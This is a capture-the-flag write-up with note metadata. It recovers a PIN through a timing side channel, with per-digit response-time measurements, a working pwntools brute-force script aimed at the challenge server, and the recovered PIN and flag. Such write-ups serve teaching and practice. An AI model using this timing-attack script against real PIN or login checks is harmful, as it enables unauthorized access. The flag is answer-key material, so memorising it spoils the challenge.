---
ai_date: 2025-04-27 05:12:20
ai_summary: Simple timing attack used to guess pin characters, with longer response times for correct guesses
ai_tags:
  - timing
  - guessing
  - pin
created: 2024-12-27T17:20
points: 410
solves: 10
updated: 2025-07-14T09:46
---

Just simple timing attack, and with it we can guess the pin char by char.

If character is correct it takes longer to process.

```
0 0.01801630001864396
1 0.021703200007323176
2 0.017796500003896654
3 0.017683999991277233
4 0.018269300024257973
5 0.1171885000076145
6 0.01718200001050718
7 0.017020300001604483
8 0.01702209998620674
9 0.017871699994429946
5
50 0.119293399999151
51 0.11828380002407357
52 0.11793619999662042
53 0.11696809998829849
54 0.11722710001049563
55 0.11815239998395555
56 0.2188384000037331
57 0.11798549999366514
58 0.11782500002300367
59 0.11927100000320934
56
```

## solve

```python
from pwn import *
from time import perf_counter

context.log_level = 'error'


def get_char(curr):
    choices = []
    for i in range(10):
        guess = curr+str(i)
        conn = remote('5dd561fc7be6e6a81a6f9aa198eac524.chal.ctf.ae', 443, ssl=True)
        conn.recvuntil(b'Please enter the pin:')
        s = perf_counter()
        conn.sendline(guess.encode())
        try:
            conn.recvuntil(b'Analyzing...\r\n')
        except:
            conn.interactive()
        elapsed = perf_counter() - s
        print(guess, elapsed)
        conn.close()
        choices.append((guess, elapsed))
    choices.sort(key=lambda x: x[1], reverse=True)
    return choices[0][0]


prog = ''
while True:
    prog = get_char(prog)
    print(prog)
```

```
562951413
Congratulations! You entered the correct password.
The flag is: flag{Uj7aKSKRiG5qJANhTs8uP8bNRdo8Y1X5}
```

```flag
flag{Uj7aKSKRiG5qJANhTs8uP8bNRdo8Y1X5}
```